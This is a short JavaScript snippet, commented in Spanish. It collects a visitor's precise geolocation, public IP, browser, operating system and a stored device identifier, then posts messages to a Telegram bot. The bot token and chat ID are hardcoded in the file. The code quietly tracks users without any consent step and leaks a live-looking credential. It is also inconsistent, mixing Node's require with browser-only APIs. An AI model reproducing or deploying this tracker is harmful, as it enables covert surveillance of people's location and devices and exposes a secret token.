// Importar la biblioteca axios en tu entorno de ejecución
const axios = require('axios');

// Objeto para almacenar los datos del usuario
var userData = {};

// Función para enviar datos a Telegram
function sendToTelegram(message) {
  const botToken = 'bot1597773806:AAFh0xrEMv7pmSuDF84XGc5MA5C7SMdiKZw'; // Agrega aquí el token de tu bot de Telegram
  const chatId = '1116794830'; // Agrega aquí el ID de tu chat de Telegram

  const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
  const data = {
    chat_id: chatId,
    text: message
  };

  axios.post(telegramUrl, data)
    .then(response => {
      console.log('Mensaje enviado a Telegram:', response.data);
    })
    .catch(error => {
      console.error('Error al enviar el mensaje a Telegram:', error);
    });
}

// Resto del código...


// Obtener datos de ubicación, IP, dispositivo, navegador y sistema operativo
function getData() {
  // Obtener la ubicación
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(function(position) {
      var latitude = position.coords.latitude;
      var longitude = position.coords.longitude;
      userData.location = latitude + ',' + longitude;

      // Obtener la IP
      fetch('https://api.ipify.org/?format=json')
        .then(response => response.json())
        .then(data => {
          userData.ip = data.ip;

          // Obtener información del dispositivo, navegador y sistema operativo
          var userAgent = navigator.userAgent;
          userData.device = navigator.platform;
          userData.browser = userAgent.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i)[1];
          userData.os = navigator.oscpu || navigator.platform;

          // Obtener el identificador de dispositivo
          var deviceIdentifier = localStorage.getItem('deviceIdentifier');
          var isFirstTime = localStorage.getItem('isFirstTime') === null;

          if (isFirstTime) {
            localStorage.setItem('isFirstTime', 'false');
            userData.deviceIdentifier = deviceIdentifier; // Corrección: asignar el identificador de dispositivo
            sendToTelegram('Es el primer inicio del dispositivo');
          } else if (deviceIdentifier === userData.device) {
            sendToTelegram('Los datos del dispositivo son iguales');
          } else {
            sendToTelegram('Los datos del dispositivo han cambiado');
          }
        })
        .catch(error => console.error('Error al obtener los datos:', error));
    });
  }
}
